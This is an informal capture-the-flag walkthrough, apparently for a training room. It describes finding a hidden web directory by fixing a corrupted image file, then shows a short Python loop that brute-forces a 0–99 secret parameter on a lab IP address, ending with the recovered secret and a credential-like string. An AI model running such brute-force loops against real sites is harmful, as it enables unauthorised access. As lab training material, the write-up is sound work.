### gobuster shows no hidden directry



but find a hidden directry by converting corrupted png file to jpeg file
/th1s_1s_h1dd3n

source code of this directry
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: </p>

<p>That is wrong! Get outta here!</p>

</div>
</body>

then is used python to brute forcing the requests
import requests
for i in range(100):
    r=requests.get(f"http://10.10.150.152/th1s_1s_h1dd3n/?secret={i}")
    if b"wrong" not in r.content:
        print("Secret is",i)

Secret is 73     






after home page shows

Welcome! I have been expecting you!

To obtain my identity you need to guess my secret!

Secret Entered: 73

Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
